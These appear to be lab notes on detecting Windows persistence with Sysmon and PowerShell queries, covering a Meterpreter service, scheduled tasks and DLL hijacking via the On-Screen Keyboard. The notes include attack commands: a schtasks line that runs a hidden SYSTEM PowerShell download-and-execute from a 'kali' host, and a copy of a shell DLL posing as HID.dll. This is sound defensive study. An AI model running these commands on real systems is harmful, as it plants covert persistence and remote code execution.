`rundll32.exe` is executed from our VindowsUpdate service with a PID of 3332. The `rundll32.exe` file loads DLLs in the Windows environment. In this case, it is the staged Meterpreter DLL payload.

Investigate **NetworkConnect** events with the same filter parameters for PID

```pwsh
Get-SysmonEvent 3 "10/29/2021 12:33:41" | Where-Object { $_.properties[3].value -eq 3332 } | Format-List
```

A defender could watch for changes or additions to key values in `HKLM\System\CurrentControlSet\Services\`. 

Look for a ProcessCreate event where the ParentImage is `dropper.exe`.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[20].value -like "*dropper.exe*" } | Format-List
```

Look for a **FileCreate** event. Filter on the **Image** field containing a filename that matches `rundll32.exe`

```pwsh
Get-SysmonEvent 11 | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
```

Look for a **DnsQuery** event where the Image field contains the file `exercise_service.exe`.

```pwsh
Get-SysmonEvent 22 | Where-Object { $_.properties[7].value -like "*exercise_service.exe*" } | Format-List
```

Look for a **NetworkConnect** event within the same minute of the DnsQuery event where the destination IP is 192.168.51.50

```pwsh
Get-SysmonEvent 3 | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

## Persisting via Scheduled Tasks

```pwsh
schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore
```

Scheduled tasks are  stored in `C:\Windows\System32\Tasks` and are accessible only with Administrative privileges. E.g., `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskMachineCore`

```bat
schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
```

Event 469813 indicates that a new scheduled task was installed.

```pwsh
Get-SecurityEvent 4698 "11/12/2021 7:26:00" "11/12/2021 7:27:00" | Format-List
```

Examine the ProcessCreate (schtasks command)

```pwsh
Get-SysmonEvent 1 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
```

FileCreate event: `C:\Windows\System32\Tasks\WindowzUpdate` file creation from `svchost.exe`

```pwsh
Get-SysmonEvent 11 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
```

ProcessCreate event

```pwsh
Get-SysmonEvent 1 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
```

DNSEvent, NetworkConnect

```pwsh
Get-SysmonEvent 22 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
Get-SysmonEvent 3 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List 
```

Find the FileCreate event where the **TargetFilename** matches the Command listed in the newly-created Scheduled Task

```pwsh
Get-SysmonEvent 11 | Where-Object { $_.properties[5].value -like "*exercise_schedtask.exe*" } | Format-List
```

Find a ProcessCreate event where the **Image** matches the command in the newly-created scheduled task

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*exercise_schedtask.exe*" } | Format-List
```

## Persisting by DLL-Sideloading/Hijacking

For both of these techniques, the vulnerability lies with **DLL search order**.

When Windows loads a DLL for an application, the OS follows a series of checks to locate the DLL.

1. The OS checks if the DLL has been loaded into memory.

2. The system will review a list of known DLLs in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`, which stores the names and locations of commonly-used DLLs (located in `C:\Windows\system32`).

3. What happens next in the search for a DLL depends on whether the **SafeDllSearchMode** key in `HKLM\System\CurrentControlSet\Control\Session Manager\` is enabled or disabled.

- By default, **SafeDllSearchMode** is enabled. Windows will search for the DLL in the directory where the program was executed, followed by System directories and the Windows directory.

- If **SafeDllSearchMode** is disabled, Windows will search where the program was executed as well as the **current directory** of the user (if applicable), before System directories and the Windows directory.

**DLL sideloading**: the malicious DLL is placed in the same directory as the application itself.

**DLL hijacking**: instead of placing the malicious DLL alongside the application, the DLL is inserted somewhere along the sequence of directories that Windows checks.

E.g., DLL hijacking involves the On-Screen Keyboard accessibility feature in Windows. One of the DLLs is `HID.dll`, a USB interface library that supports control between USB devices and whatever application requires them.

When the On-Screen Keyboard is loaded, Windows begins its search for all DLLs, including `HID.dll`. However, Windows first looks in `C:\Program Files\Common Files\microsoft shared\ink` for the DLL before moving on to `C:\Windows\System32`. Under normal circumstances, the DLL will be found in the System32 directory and execution of the application succeeds. However, an attacker with sufficient privileges could store a malicious DLL in the ink subdirectory and hijack the DLL search order.

```bat
copy "C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll"
osk
```

FileCreate event was generated when we wrote HID.dll to the new directory

```pwsh
Get-SysmonEvent 11 "11/18/2021 9:03:23" "11/18/2021 9:03:25" | Format-List
```

Search for ProcessCreate events in which the parent image is `osk.exe`.

```pwsh
Get-SysmonEvent 1 "11/18/2021 9:03:24" | Where-Object { $_.properties[20].value -like "*osk*" } | Format-List
```

search for NetworkConnect events where the Image field contains the file

```pwsh
Get-SysmonEvent $null "11/18/2021 10:22:06" | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
```

Look for the ProcessCreate events with On-Screen Keyboard's file in the Image field.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*osk*" } | Format-List
```

Look for a CreateRemoteThread event where the TargetImage matches the new process (mai check lai)

```pwsh
Get-SysmonEvent 8 | Where-Object { $_.properties[6].value -like "*lsass.exe*" } | Format-List
```